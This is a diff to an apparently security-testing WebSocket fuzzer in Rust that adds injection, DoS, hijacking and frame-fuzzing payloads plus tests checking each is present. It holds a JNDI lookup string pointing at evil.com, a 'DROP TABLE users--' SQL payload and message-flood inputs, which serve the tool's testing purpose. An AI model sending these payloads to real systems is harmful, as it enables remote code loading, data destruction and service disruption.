@@ -49,12 +49,15 @@ pub enum WebSocketOpcode {
 }
 
 pub struct WebSocketFuzzer {
+    #[allow(dead_code)]
+    url: String,
     subprotocols: Vec<String>,
 }
 
 impl WebSocketFuzzer {
-    pub fn new(_url: String) -> Self {
+    pub fn new(url: String) -> Self {
         Self {
+            url,
             subprotocols: vec![],
         }
     }
@@ -112,45 +115,11 @@ impl WebSocketFuzzer {
         results
     }
 
-    pub async fn fuzz(
-        &mut self,
-        _client: &reqwest::Client,
-    ) -> Result<Vec<crate::fuzzer::engine::FuzzResult>, anyhow::Error> {
-        let mut results = Vec::new();
-
-        let tests = self.generate_all_tests();
-
-        for test in tests {
-            results.push(crate::fuzzer::engine::FuzzResult {
-                payload: Payload {
-                    payload_type: PayloadType::Websocket,
-                    payload: test.message.clone(),
-                    description: test.description.clone(),
-                    severity: test.severity,
-                    tags: vec!["websocket".to_string()],
-                },
-                status_code: 0,
-                response_time_ms: 0,
-                response_length: None,
-                response_body: None,
-                is_waf_blocked: false,
-                is_anomaly: test.success,
-                is_redos_suspected: false,
-                leaks_found: vec![],
-                error: None,
-                owasp_category: None,
-                detected_severity: test.severity,
-            });
-        }
-
-        Ok(results)
-    }
-
     pub fn generate_all_tests(&self) -> Vec<WebSocketTestResult> {
         let mut results = Vec::new();
         results.extend(self.generate_injection_tests());
         results.extend(self.generate_dos_tests());
-        results.extend(self.generate_cswsb_tests());
+        results.extend(self.generate_cswsh_tests());
         results.extend(self.generate_message_fuzz_tests());
         results.extend(self.generate_frame_fuzz_tests());
         results.extend(self.generate_subprotocol_tests());
@@ -223,7 +192,7 @@ impl WebSocketFuzzer {
         results
     }
 
-    pub fn generate_cswsb_tests(&self) -> Vec<WebSocketTestResult> {
+    pub fn generate_cswsh_tests(&self) -> Vec<WebSocketTestResult> {
         let mut results = Vec::new();
 
         let malicious_origins = vec![
@@ -314,6 +283,7 @@ impl WebSocketFuzzer {
 pub fn get_payloads() -> Vec<Payload> {
     let mut payloads = Vec::new();
 
+    // Injection payloads
     payloads.push(Payload {
         payload_type: PayloadType::Websocket,
         payload: "'; DROP TABLE users--".to_string(),
@@ -336,6 +306,99 @@ pub fn get_payloads() -> Vec<Payload> {
         description: "Template injection via WebSocket".to_string(),
         severity: Severity::High,
         tags: vec!["websocket".to_string(), "ssti".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "${jndi:ldap://evil.com/a}".to_string(),
+        description: "JNDI injection via WebSocket".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["websocket".to_string(), "injection".to_string(), "jndi".to_string()],
+    });
+
+    // DoS payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "a".repeat(100000),
+        description: "Large text message DoS".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["websocket".to_string(), "dos".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "ping".repeat(10000),
+        description: "WebSocket message flood".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["websocket".to_string(), "dos".to_string()],
+    });
+
+    // CSWSH payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "https://evil.com".to_string(),
+        description: "Cross-Site WebSocket Hijacking origin".to_string(),
+        severity: Severity::High,
+        tags: vec!["websocket".to_string(), "cswsh".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "null".to_string(),
+        description: "Null origin WebSocket hijacking".to_string(),
+        severity: Severity::High,
+        tags: vec!["websocket".to_string(), "cswsh".to_string()],
+    });
+
+    // Message fuzzing payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "\u{0000}\u{0000}\u{0000}".to_string(),
+        description: "Null bytes in WebSocket message".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["websocket".to_string(), "fuzzing".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "\u{0001}\u{0002}\u{0003}".to_string(),
+        description: "Control characters in WebSocket message".to_string(),
+        severity: Severity::Low,
+        tags: vec!["websocket".to_string(), "fuzzing".to_string()],
+    });
+
+    // Frame fuzzing payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "0x00:continuation".to_string(),
+        description: "Invalid continuation frame".to_string(),
+        severity: Severity::Low,
+        tags: vec!["websocket".to_string(), "frame-fuzz".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "0x08:close:0x03e8".to_string(),
+        description: "Close frame with status code".to_string(),
+        severity: Severity::Info,
+        tags: vec!["websocket".to_string(), "frame-fuzz".to_string()],
+    });
+
+    // Subprotocol payloads
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "graphql-ws".to_string(),
+        description: "GraphQL WebSocket subprotocol test".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["websocket".to_string(), "subprotocol".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Websocket,
+        payload: "mqtt".to_string(),
+        description: "MQTT over WebSocket subprotocol test".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["websocket".to_string(), "subprotocol".to_string()],
     });
 
     payloads
@@ -376,9 +439,27 @@ mod tests {
         let has_sqli = payloads.iter().any(|p| p.payload.contains("DROP TABLE"));
         let has_xss = payloads.iter().any(|p| p.payload.contains("<script>"));
         let has_template = payloads.iter().any(|p| p.payload.contains("{{7*7}}"));
+        let has_jndi = payloads.iter().any(|p| p.payload.contains("jndi:"));
+        let has_dos = payloads
+            .iter()
+            .any(|p| p.tags.iter().any(|t| t == "dos"));
+        let has_cswsh = payloads
+            .iter()
+            .any(|p| p.tags.iter().any(|t| t == "cswsh"));
+        let has_fuzzing = payloads
+            .iter()
+            .any(|p| p.tags.iter().any(|t| t == "fuzzing"));
+        let has_subprotocol = payloads
+            .iter()
+            .any(|p| p.tags.iter().any(|t| t == "subprotocol"));
         assert!(has_sqli, "Missing SQL injection payload");
         assert!(has_xss, "Missing XSS payload");
         assert!(has_template, "Missing template injection payload");
+        assert!(has_jndi, "Missing JNDI injection payload");
+        assert!(has_dos, "Missing DoS payload");
+        assert!(has_cswsh, "Missing CSWSH payload");
+        assert!(has_fuzzing, "Missing fuzzing payload");
+        assert!(has_subprotocol, "Missing subprotocol payload");
     }
 
     #[test]
